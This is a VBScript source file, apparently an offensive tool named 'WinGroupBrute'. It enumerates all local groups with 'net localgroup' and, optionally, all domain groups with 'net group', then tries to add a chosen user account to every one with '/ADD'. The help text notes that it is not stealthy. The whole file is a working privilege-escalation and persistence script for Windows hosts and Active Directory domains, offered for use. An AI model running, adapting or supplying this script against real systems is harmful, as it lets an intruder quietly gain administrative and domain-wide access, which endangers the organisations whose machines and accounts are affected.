Set objArgs = Wscript.Arguments
PrintBanner()
bool_helpText = 0
str_user = ""
bool_domain = 0
int_group_counter = 0
int_domain_group_counter = 0
If objArgs.count = 0 Then
	Call GenLog("Missing required arguments.","ERROR")
	PrintHelp()
	wscript.quit(1)
End If
int_args = objArgs.count - 1
For i = 0 to int_args
	If objArgs(i) = "--help" Then
		bool_helpText = 1
	ElseIf objArgs(i) = "--domain" Then
		bool_domain = 1
	ElseIf objArgs(i) = "--user" Then
		str_user = ObjArgs(i + 1)
	End If
Next
If bool_helpText = 1 Then
	PrintHelp()
	wscript.quit(0)
End If
' Get the localgroups into an array
output_array = GetCommandOut("net localgroup")
int_arr_leng = UBound(output_array)
int_arr_leng = int_arr_leng - 3
IF int_arr_leng > 0 Then
	int_localgroups = int_arr_leng - 5
ELSE 
	int_localroups = 0
END IF
Call GenLog("Found " & int_localgroups & " localgroups.", "INFO")
For i = 4 to int_arr_leng
		localGroupOutArr = GetCommandOut("net localgroup """ & output_array(i) & """ /ADD " & str_user)
		If localGroupOutArr(0) = 0 Then
			Call GenLog("Successfully added user to group: " & output_array(i), "INFO")
			int_group_counter = int_group_counter + 1
		END IF
Next
Call GenLog("Added " & str_user & " to " & int_group_counter & " local groups.", "INFO")
IF bool_domain = 1 Then
	output_array = GetCommandOut("net group")
	int_arr_leng = UBound(output_array)
	int_arr_leng = int_arr_leng - 3
	IF int_arr_leng > 0 Then
		int_domaingroups = int_arr_leng - 5
	ELSE 
		int_domaingroups = 0
	END IF
	Call GenLog("Found " & int_domaingroups & " domain groups.", "INFO")
	For i = 4 to int_arr_leng
		domainGroupOutArr = GetCommandOut("net group """ & output_array(i) & """ /ADD " & str_user)
		If domainGroupOutArr(0) = 0 Then
			Call GenLog("Successfully added user to domain group: " & output_array(i), "INFO")
			int_domain_group_counter = int_domain_group_counter + 1
		END IF
	Next
	Call GenLog("Added " & str_user & " to " & int_domain_group_counter & " domain groups.", "INFO")
 End IF


Function PrintHelp()
	wscript.echo("")
	wscript.echo("This script loops through all available groups and attempts to add a user to them.")
	wscript.echo("This script is NOT stealthy.")
	wscript.echo("")
	wscript.echo("Arguments:")
	wscript.echo("			--user		- The user you would like to add to groups (Required)")
	wscript.echo("			--domain	- Boolean. Attempt to add user to domain groups as well")
	wscript.echo("			--help		- Print this help text")
End Function

Function PrintBanner()
	wscript.echo(" _    _ _       _____                      ______            _       ")
	wscript.echo("| |  | (_)     |  __ \                     | ___ \          | |      ")
	wscript.echo("| |  | |_ _ __ | |  \/_ __ ___  _   _ _ __ | |_/ /_ __ _   _| |_ ___ ")
	wscript.echo("| |/\| | | '_ \| | __| '__/ _ \| | | | '_ \| ___ \ '__| | | | __/ _ \")
	wscript.echo("\  /\  / | | | | |_\ \ | | (_) | |_| | |_) | |_/ / |  | |_| | ||  __/")
	wscript.echo(" \/  \/|_|_| |_|\____/_|  \___/ \__,_| .__/\____/|_|   \__,_|\__\___|")
	wscript.echo("                                     | |                             ")
	wscript.echo("                                     |_|  @Deguy93210594  sageisg.com")
	wscript.echo("")
End Function

Function GetCommandOut(str_command)
	'Call GenLog("Running command: " & str_command, "INFO")
	set ObjShell = Wscript.CreateObject("Wscript.Shell")
	set objExecObject = objShell.Exec(str_command)
	int_i = 0
	str_test = ""
	Do While Not objExecObject.StdOut.AtEndOfStream
		int_i = int_i + 1
		str_test = objExecObject.StdOut.ReadLine()
	Loop
	set objExecObject = objShell.Exec(str_command)
	int_a = 0
	Dim ret_array()
	int_i = int_i + 1
	Redim ret_array(int_i)
	int_b = int_i - 2
	Do While Not objExecObject.StdOut.AtEndOfStream
		If int_a < int_b Then
			ret_array(int_a) = Replace(objExecObject.StdOut.ReadLine(),"*","")
			int_a = int_a + 1
		Else 
			exit Do
		End If
	Loop
	int_d = int_i - 1
	ret_array(int_d) = objExecObject.ExitCode
	GetCommandOut = ret_array
End Function



Function GenLog(str_text,str_lvl)
	wscript.echo(Now & " " & "["&str_lvl&"]" & "	-	" & str_text)
End Function